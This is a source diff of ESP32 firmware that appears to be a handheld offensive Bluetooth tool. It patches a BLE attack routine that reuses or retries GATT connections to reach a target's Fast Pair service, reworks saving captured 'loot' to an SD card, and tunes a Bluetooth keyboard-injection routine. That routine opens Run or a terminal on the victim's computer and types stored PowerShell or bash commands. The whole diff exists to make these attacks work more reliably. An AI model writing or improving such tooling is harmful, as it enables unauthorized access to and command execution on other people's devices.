@@ -8324,6 +8324,12 @@ static void wpProbeDevice(int idx) {
     tft.setCursor(10, 115);
     tft.print(d.addrStr);
 
+    // Disconnect from previous target if still connected (user picked a different device)
+    if (pWpClient && pWpClient->isConnected()) {
+        pWpClient->disconnect();
+        delay(300);
+    }
+
     // Create or reuse GATT client
     if (!pWpClient) {
         pWpClient = BLEDevice::createClient();
@@ -8450,8 +8456,8 @@ static void wpProbeDevice(int idx) {
         #endif
     }
 
-    // Disconnect
-    pWpClient->disconnect();
+    // Stay connected — attack reuses this GATT session to avoid reconnection failures
+    // Connection will be cleaned up by wpRunAttack(), cleanup(), or next probe
 
     inResult = true;
     wpDrawResult();
@@ -8726,12 +8732,27 @@ static void wpSaveLoot() {
     Serial.printf("[WP-SAVE] wpSaveLoot called — heap: %u\n", ESP.getFreeHeap());
     #endif
 
+    // Shut down BLE before SD access — BLE controller DMA/interrupts disrupt VSPI bus
+    if (pWpClient) {
+        if (pWpClient->isConnected()) pWpClient->disconnect();
+        pWpClient = nullptr;
+    }
+    if (pWpScan) { pWpScan->stop(); pWpScan = nullptr; }
+    BLEDevice::deinit(false);
+    delay(100);
+
     spiDeselect();
+    SPI.end();
+    delay(10);
+    SPI.begin(18, 19, 23);
     pinMode(SD_CS, OUTPUT);
     digitalWrite(SD_CS, HIGH);
+    delay(10);
 
-    if (!SD.begin(SD_CS)) {
-        SPI.begin(18, 19, 23, SD_CS);
+    if (!SD.begin(SD_CS, SPI, 4000000)) {
+        SPI.end();
+        delay(50);
+        SPI.begin(18, 19, 23);
         if (!SD.begin(SD_CS, SPI, 4000000)) {
             #if CYD_DEBUG
             Serial.printf("[WP-SAVE] SD FAILED — heap: %u\n", ESP.getFreeHeap());
@@ -8873,36 +8894,67 @@ static void wpRunAttack() {
 
     if (pWpScan) pWpScan->stop();
 
-    wpAtkAddLog("Connecting...", HALEHOUND_HOTPINK);
-    wpDrawAtkLog();
+    // Reuse the live GATT connection from probe if still up
+    if (pWpClient && pWpClient->isConnected()) {
+        wpAtkAddLog("Reusing probe link!", HALEHOUND_MAGENTA);
+        wpDrawAtkLog();
+    } else {
+        // Connection dropped — full BLE reinit and reconnect
+        wpAtkAddLog("Reconnecting...", HALEHOUND_HOTPINK);
+        wpDrawAtkLog();
 
-    if (!pWpClient) {
+        if (pWpClient) { pWpClient = nullptr; }
+        if (pWpScan) { pWpScan = nullptr; }
+        BLEDevice::deinit(false);
+        delay(300);
+
+        releaseClassicBtMemory();
+        BLEDevice::init("");
+        delay(150);
+
+        pWpScan = BLEDevice::getScan();
+        if (pWpScan) {
+            pWpScan->setActiveScan(true);
+            pWpScan->setInterval(100);
+            pWpScan->setWindow(99);
+        }
+
         pWpClient = BLEDevice::createClient();
-    }
-    if (!pWpClient) {
-        wpAtkAddLog("Client create FAILED", 0xF800);
-        wpDrawAtkLog();
-        delay(2000);
-        inAttack = false;
-        inResult = true;
-        wpDrawResult();
-        return;
-    }
+        if (!pWpClient) {
+            wpAtkAddLog("Client create FAILED", 0xF800);
+            wpDrawAtkLog();
+            delay(2000);
+            inAttack = false;
+            inResult = true;
+            wpDrawResult();
+            return;
+        }
 
-    BLEAddress addr(d.addrStr);
-    bool connected = pWpClient->connect(addr, d.addrType);
-    if (!connected) {
-        wpAtkAddLog("Connection FAILED", 0xF800);
-        wpDrawAtkLog();
-        delay(2000);
-        inAttack = false;
-        inResult = true;
-        wpDrawResult();
-        return;
-    }
+        BLEAddress addr(d.addrStr);
+        bool connected = false;
+        for (int attempt = 1; attempt <= 3 && !connected; attempt++) {
+            if (attempt > 1) {
+                char retryBuf[28];
+                snprintf(retryBuf, sizeof(retryBuf), "Retry %d/3...", attempt);
+                wpAtkAddLog(retryBuf, HALEHOUND_HOTPINK);
+                wpDrawAtkLog();
+                delay(500);
+            }
+            connected = pWpClient->connect(addr, d.addrType);
+        }
+        if (!connected) {
+            wpAtkAddLog("Connection FAILED x3", 0xF800);
+            wpDrawAtkLog();
+            delay(2000);
+            inAttack = false;
+            inResult = true;
+            wpDrawResult();
+            return;
+        }
 
-    wpAtkAddLog("Connected!", HALEHOUND_MAGENTA);
-    wpDrawAtkLog();
+        wpAtkAddLog("Connected!", HALEHOUND_MAGENTA);
+        wpDrawAtkLog();
+    }
 
     // Find FP service
     wpAtkAddLog("Finding FP service...", HALEHOUND_HOTPINK);
@@ -9126,6 +9178,7 @@ static void wpRunAttack() {
 
     inAttack = false;
     inAttackResult = true;
+    inResult = true;       // MUST be true so loop() reaches the inAttackResult branch
     atkResultPage = 0;
     wpDrawAttackReport();
 }
@@ -9194,7 +9247,11 @@ void loop() {
             tft.fillScreen(HALEHOUND_BLACK);
             drawStatusBar();
             wpDrawHeader();
-            wpDrawList();
+            if (inAttackResult) {
+                wpDrawAttackReport();
+            } else {
+                wpDrawList();
+            }
         }
         return;
     }
@@ -9208,7 +9265,8 @@ void loop() {
         if (getTouchPoint(&tx, &ty)) {
             if (ty >= 20 && ty <= 36) {
                 if (tx >= 10 && tx < 26) {
-                    // Back icon
+                    // Back icon — waitForTouchRelease prevents double-fire
+                    waitForTouchRelease();
                     if (inAttackResult) {
                         inAttackResult = false;
                         inResult = true;
@@ -9229,8 +9287,8 @@ void loop() {
                     return;
                 }
                 else if (tx >= 96 && tx < 144) {
-                    // Loot viewer icon — generous touch zone around x=112
-                    if (!inResult && !inAttackResult && !inAttack) {
+                    // Loot viewer icon — accessible from device list and attack result
+                    if (!inAttack && (!inResult || inAttackResult)) {
                         inLootViewer = true;
                         WPLootViewer::setup();
                         lastTap = millis();
@@ -9324,16 +9382,24 @@ void loop() {
             waitForTouchRelease();
         }
 
-        // Page nav — BTN_BACK zone (x=160-240,y=0-60) or BTN_UP zone (x=0-80,y=0-60)
-        if (buttonPressed(BTN_BACK)) {
-            atkResultPage = (atkResultPage == 0) ? 1 : 0;
-            wpDrawAttackReport();
-        }
+        // Page nav — hardware buttons (DIV)
         if (buttonPressed(BTN_RIGHT)) {
             if (atkResultPage < 1) { atkResultPage++; wpDrawAttackReport(); }
         }
         if (buttonPressed(BTN_LEFT)) {
             if (atkResultPage > 0) { atkResultPage--; wpDrawAttackReport(); }
+        }
+
+        // Page nav — touch zone for bottom-right arrow area (CYD)
+        {
+            uint16_t px, py;
+            if (getTouchPoint(&px, &py)) {
+                if (px >= 160 && py >= SCREEN_HEIGHT - 38) {
+                    atkResultPage = (atkResultPage == 0) ? 1 : 0;
+                    waitForTouchRelease();
+                    wpDrawAttackReport();
+                }
+            }
         }
     } else {
         // Result view — LEFT returns to list
@@ -9495,9 +9561,11 @@ static void injectPayload() {
             // Win+R to open Run dialog
             bleKb->press(KEY_LEFT_GUI);
             bleKb->press('r');
-            delay(85);
-            bleKb->releaseAll();
-            delay(500);
+            delay(30);
+            bleKb->release('r');
+            delay(10);
+            bleKb->release(KEY_LEFT_GUI);
+            delay(700);
             strncpy_P(payloadBuf, BD_PS_CMD, sizeof(payloadBuf) - 1);
             payloadBuf[sizeof(payloadBuf) - 1] = '\0';
             payload = payloadBuf;
@@ -9508,9 +9576,12 @@ static void injectPayload() {
             bleKb->press(KEY_LEFT_CTRL);
             bleKb->press(KEY_LEFT_ALT);
             bleKb->press('t');
-            delay(85);
-            bleKb->releaseAll();
-            delay(800);
+            delay(30);
+            bleKb->release('t');
+            delay(10);
+            bleKb->release(KEY_LEFT_ALT);
+            bleKb->release(KEY_LEFT_CTRL);
+            delay(900);
             strncpy_P(payloadBuf, BD_BASH_CMD, sizeof(payloadBuf) - 1);
             payloadBuf[sizeof(payloadBuf) - 1] = '\0';
             payload = payloadBuf;
@@ -9530,9 +9601,11 @@ static void injectPayload() {
             // Win+R → browser URL
             bleKb->press(KEY_LEFT_GUI);
             bleKb->press('r');
-            delay(85);
-            bleKb->releaseAll();
-            delay(500);
+            delay(30);
+            bleKb->release('r');
+            delay(10);
+            bleKb->release(KEY_LEFT_GUI);
+            delay(700);
             strncpy_P(payloadBuf, BD_RICKROLL_URL, sizeof(payloadBuf) - 1);
             payloadBuf[sizeof(payloadBuf) - 1] = '\0';
             payload = payloadBuf;
